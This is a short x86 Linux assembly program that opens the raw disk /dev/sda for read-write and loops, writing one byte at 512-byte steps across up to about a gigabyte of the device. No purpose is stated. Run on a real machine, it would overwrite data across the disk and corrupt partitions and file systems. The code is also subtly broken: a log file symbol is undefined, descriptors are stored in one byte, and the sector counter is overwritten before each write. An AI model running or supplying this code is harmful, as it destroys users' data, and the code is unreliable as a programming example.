section .data
    disk db "/dev/sda", 0      ; Modify for correct disk device
    buffer db 1                ; Data (1 bit stored as a byte)
    new_line db 10             ; Newline character for logging

section .bss
    fd resb 1                  ; File descriptor for disk
    log_fd resb 1              ; File descriptor for logging

section .text
    global _start

_start:
    ; Open the disk (sys_open)
    mov eax, 5                ; sys_open syscall
    mov ebx, disk             ; Raw disk device
    mov ecx, 2                ; O_RDWR (Read/Write access)
    mov edx, 0                ; No extra flags
    int 0x80
    mov [fd], eax             ; Store file descriptor

    ; Open log file
    mov eax, 5
    mov ebx, log_file
    mov ecx, 1                ; O_WRONLY
    mov edx, 0644             ; Permissions
    int 0x80
    mov [log_fd], eax         ; Store log file descriptor

    ; Loop through all sectors
    xor ecx, ecx              ; Start at sector 0

fill_space:
    ; Seek to sector (sys_lseek)
    mov eax, 19               ; sys_lseek syscall
    mov ebx, [fd]             ; Disk file descriptor
    mov edx, 0                ; SEEK_SET
    int 0x80

    ; Write 1 byte to sector (sys_write)
    mov eax, 4
    mov ebx, [fd]
    mov ecx, buffer
    mov edx, 1
    int 0x80

    ; Log written sector
    mov eax, 4
    mov ebx, [log_fd]
    mov ecx, new_line
    mov edx, 1
    int 0x80

    ; Move to next sector
    add ecx, 512              ; Advance by 512 bytes (sector size)
    cmp ecx, 1000000000       ; Stop after large number of sectors (adjust for full disk)
    jl fill_space             ; Loop until disk is full

    ; Close files
    mov eax, 6
    mov ebx, [fd]
    int 0x80

    mov eax, 6
    mov ebx, [log_fd]
    int 0x80

    ; Exit program
    mov eax, 1
    xor ebx, ebx
    int 0x80
